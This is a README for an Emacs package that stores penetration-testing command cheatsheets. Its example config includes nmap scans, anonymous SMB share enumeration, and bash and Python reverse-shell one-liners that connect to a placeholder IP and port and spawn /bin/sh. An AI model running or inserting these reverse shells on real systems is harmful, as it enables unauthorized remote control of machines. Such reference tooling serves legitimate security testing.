# icheat

Interactive cheatsheet in Emacs.

Define lists of commands that are useful to remember in specific
contexts, such as during a penetration test.

```emacs-lisp
(icheat-def-cmd
 "nmap" t
 (("standard"       . "nmap -sC -sV --min-rate 1000 %ip")
  ("full-tcp-ports" . "nmap -p- --min-rate 1000 %ip")
  ("standard-ad"    . "nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,54296 -sCV %ip")))


(icheat-def-cmd
 "smb" t
 (("guest-access"        . "netexec smb %domain -u guest -p '' --shares")
  ("anonymous-access"    . "netexec smb %domain --shares")
  ("smbclient anonymous" . "smbclient -N //%domain/%share")
  ))

(icheat-def-cmd
 "reverse" t
 (("bash-1"   . "bash -i >& /dev/tcp/%ip/%port 0>&1")
  ("bash-2"   . "bash -c \"bash -i >& /dev/tcp/%ip/%port 0>&1\"")
  ("python-1" . "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%ip\",%port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")))
```

For each command defined, a specific function will be created, which
will allow you to generate the specific command you require in the
moment of need. The name of the function follows the name of the
command. In the previous example the code will create the functions
`icheat-cmd-nmap`, `icheat-cmd-smb` and `icheat-cmd-reverse`.

Observe also how during the creation of the command list you can use
special format identifiers such as `%ip`, `%port`, `%domain`, `%share`.

```
bash -i >& /dev/tcp/%ip/%port 0>&1
```

These identifiers are resolved during the generation of the
command. The final mechanism is still being implemented.

Finally, it is worth to note that depending on how the function is
called, the generated output is returned either as a direct value, or
it is copied into the kill-ring.